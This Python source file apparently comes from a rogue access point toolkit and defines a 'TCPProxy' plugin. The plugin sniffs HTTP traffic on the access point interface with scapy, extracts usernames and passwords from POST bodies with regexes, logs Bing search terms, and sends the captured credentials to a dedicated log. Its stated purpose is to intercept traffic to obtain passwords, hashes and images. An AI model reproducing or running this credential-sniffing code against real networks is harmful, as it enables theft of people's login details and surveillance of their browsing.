from core.config.globalimport import *
from collections import OrderedDict
from functools import partial
from threading import Thread
import queue
from scapy.all import *
import logging
#from plugins.analyzers import *

import core.utility.constants as C
from core.common.platforms import setup_logger
from core.servers.proxy.proxymode import *
from core.utility.collection import SettingsINI
# from core.widgets.docks.dockmonitor import (
#     dockTCPproxy,dockUrlMonitor
# )
from core.common.uimodel import *
from plugins.analyzers import *
from core.widgets.docks.dock import DockableWidget

class TCPProxyDock(DockableWidget):
    id = "TCPProxy"
    title = "TCPProxy"

    def __init__(self,parent=0,title="",info={}):
        super(TCPProxyDock,self).__init__(parent,title,info={})
        self.setObjectName(self.title)
        self.THeaders  = OrderedDict([ ('Plugin',[]),('Logging',[])])


    def writeModeData(self,data):
        ''' get data output and add on QtableWidgets '''
        self.THeaders['Plugin'].append(data.keys()[0])
        self.THeaders['Logging'].append(data[data.keys()[0]])
        Headers = []
        print(data)

    def stopProcess(self):
        pass

class TCPProxy(ProxyMode):
    Name = "tcpproxy_plugin"
    Author = "Pumpkin-Dev"
    Description = "Sniff for intercept network traffic on UDP,TCP protocol get password,hash,image,etc..."
    Hidden = False
    LogFile = C.LOG_TCPPROXY
    _cmd_array = []
    ModSettings = True
    ModType = "proxy" 
    TypePlugin =  2 

    def __init__(self,parent=None, **kwargs):
        super(TCPProxy,self).__init__(parent)
        self.setID(self.Name)
        self.setTypePlugin(self.TypePlugin)
        self.config = SettingsINI(C.CONFIG_TP_INI)
        self.plugins = []
        self.parent = parent
        self.bt_SettingsDict = {}
        self.check_PluginDict = {}
        self.search_all_ProxyPlugins()

        setup_logger("NetCreds",C.LOG_CREDSCAPTURE,"CapturedCreds")
        self.LogCredsMonitor = logging.getLogger("NetCreds")

        #self.dockwidget = TCPProxyDock(None,title=self.Name)

    def onProxyDisabled(self):
        self.handler = self.parent.Plugins.MITM
        self.handler.CredMonitor.controlui.setChecked(False)
        self.handler.URLMonitor.controlui.setChecked(False)

    def onProxyEnabled(self):
        self.handler=self.parent.Plugins.MITM
        self.handler.CredMonitor.controlui.setChecked(True)
        self.handler.URLMonitor.controlui.setChecked(True)


    def setPluginOption(self, name, status):
        ''' get each plugins status'''
        # enable realtime disable and enable plugin
        if self.conf.get('accesspoint', 'statusAP', format=bool):
            self.reactor.disablePlugin(name, status)
        self.conf.set('plugins', name, status)

    def search_all_ProxyPlugins(self):
        ''' load all plugins function '''
        plugin_classes = default.PSniffer.__subclasses__()
        for p in plugin_classes:
            if p().Name != 'httpCap':
                self.plugins.append(p())

    def boot(self):
        #self.handler = self.parent.Plugins.MITM
        iface =  self.conf.get('accesspoint','interfaceAP')
        self.reactor= TCPProxyCore(iface, self.parent.currentSessionID)
        self.reactor.setObjectName(self.Name)
        self.reactor._ProcssOutput.connect(self.LogOutput)

    def LogOutput(self,data):
        print(data)
        # if self.conf.get('accesspoint', 'statusAP', format=bool):
        #     if data.keys()[0] == 'urlsCap':
        #         self.handler.URLMonitor.dockwidget.writeModeData(data)
        #         self.logger.info('[ {0[src]} > {0[dst]} ] {1[Method]} {1[Host]}{1[Path]}'.format(
        #                 data['urlsCap']['IP'], data['urlsCap']['Headers']))
        #     elif data.keys()[0] == 'POSTCreds':
        #         self.handler.CredMonitor.dockwidget.writeModeData(data)
        #         self.LogCredsMonitor.info('URL: {}'.format(data['POSTCreds']['Url']))
        #         self.LogCredsMonitor.info('UserName: {}'.format(data['POSTCreds']['User']))
        #         self.LogCredsMonitor.info('UserName: {}'.format(data['POSTCreds']['Pass']))
        #         self.LogCredsMonitor.info('Packets: {}'.format(data['POSTCreds']['Destination']))
        #     else:
        #         self.tableLogging.writeModeData(data)
        #         self.LogTcpproxy.info('[{}] {}'.format(data.keys()[0],data[data.keys()[0]]))


class TCPProxyCore(QtCore.QThread):
    _ProcssOutput = QtCore.pyqtSignal(object)
    def __init__(self,interface,session):
        QtCore.QThread.__init__(self)
        self.interface  = interface
        self.session    = session
        self.stopped    = False
        self.config     = SettingsINI(C.CONFIG_TP_INI)

    def run(self):
        self.main()

    def sniffer(self,q):
        while not self.stopped:
            try:
                sniff(iface=self.interface,
                      filter="tcp and ( port 80 or port 8080 or port 10000)",
                      prn =lambda x : q.put(x), store=0)
            except Exception:pass
            if self.stopped:
                break

    def disablePlugin(self,name, status):
        ''' disable plugin by name '''
        plugin_on = []
        if status:
            for plugin in self.plugins:
                plugin_on.append(self.plugins[plugin].Name)
            if name not in plugin_on:
                for p in self.plugin_classes:
                    pluginconf = p()
                    if  pluginconf.Name == name:
                        self.plugins[name] = pluginconf
                        self.plugins[name].getInstance()._activated = True
                        print('TCPProxy::{0:17} status:On'.format(name))
        else:
            print('TCPProxy::{0:17} status:Off'.format(name))
            self.plugins.pop(self.plugins[name].Name)

    def main(self):
        self.plugins = {}
        self.plugin_classes = default.PSniffer.__subclasses__()
        for p in self.plugin_classes:
            plugin_load = p()
            self.plugins[plugin_load.Name] = plugin_load
            self.plugins[plugin_load.Name].output = self._ProcssOutput
            self.plugins[plugin_load.Name].session = self.session
        print('\n[*] TCPProxy running on port 80/8080:\n')
        for name in self.plugins.keys():
            if self.config.get('plugins', name, format=bool):
                self.plugins[name].getInstance()._activated = True
                print('TCPProxy::{0:17} status:On'.format(name))
        print('\n')
        q = queue.Queue()
        sniff = Thread(target =self.sniffer, args = (q,))
        sniff.start()
        while (not self.stopped):
            try:
                pkt = q.get(timeout = 0)
                for Active in self.plugins.keys():
                    if self.plugins[Active].getInstance()._activated:
                        try:
                            self.plugins[Active].filterPackets(pkt)
                        except Exception: pass
            except queue.Empty:
              pass

    def snifferParser(self,pkt):
        try:
            if pkt.haslayer(Ether) and pkt.haslayer(Raw) and not pkt.haslayer(IP) and not pkt.haslayer(IPv6):
                return
            self.dport = pkt[TCP].dport
            self.sport = pkt[TCP].sport
            if pkt.haslayer(TCP) and pkt.haslayer(Raw) and pkt.haslayer(IP):
                self.src_ip_port = str(pkt[IP].src)+':'+str(self.sport)
                self.dst_ip_port = str(pkt[IP].dst)+':'+str(self.dport)

            if pkt.haslayer(Raw):
                self.load = pkt[Raw].load
                if self.load.startswith('GET'):
                    self.get_http_GET(self.src_ip_port,self.dst_ip_port,self.load)
                    self.searchBingGET(self.load.split('\n', 1)[0].split('&')[0])
                elif self.load.startswith('POST'):
                    header,url = self.get_http_POST(self.load)
                    self.getCredentials_POST(pkt.getlayer(Raw).load,url,header,self.dport,self.sport)
        except:
            pass

    def searchBingGET(self,search):
        if 'search?q' in search :
            searched = search.split('search?q=',1)[1]
            searched = searched.replace('+',' ')
            print('Search::BING { %s }'%(searched))

    def getCredentials_POST(self,payload,url,header,dport,sport):
        user_regex = '([Ee]mail|%5B[Ee]mail%5D|[Uu]ser|[Uu]sername|' \
        '[Nn]ame|[Ll]ogin|[Ll]og|[Ll]ogin[Ii][Dd])=([^&|;]*)'
        pw_regex = '([Pp]assword|[Pp]ass|[Pp]asswd|[Pp]wd|[Pp][Ss][Ww]|' \
        '[Pp]asswrd|[Pp]assw|%5B[Pp]assword%5D)=([^&|;]*)'
        username = re.findall(user_regex, payload)
        password = re.findall(pw_regex, payload)
        if not username ==[] and not password == []:
            self._ProcssOutput.emit({'POSTCreds':{'User':username[0][1],
            'Pass': password[0][1],'Url':url,'destination':'{}/{}'.format(sport,dport)}})

    def get_http_POST(self,load):
        dict_head = {}
        try:
            headers, body = load.split("\r\n\r\n", 1)
            header_lines = headers.split('\r\n')
            for item in header_lines:
                try:
                    dict_head[item.split()[0]] = item.split()[1]
                except Exception:
                    pass
            if 'Referer:' in dict_head.keys():
                return dict_head ,dict_head['Referer:']
        except ValueError:
            return None,None
        return dict_head, None

    def stop(self):
        self.stopped = True
        print('Thread::[{}] successfully stopped.'.format(self.objectName()))
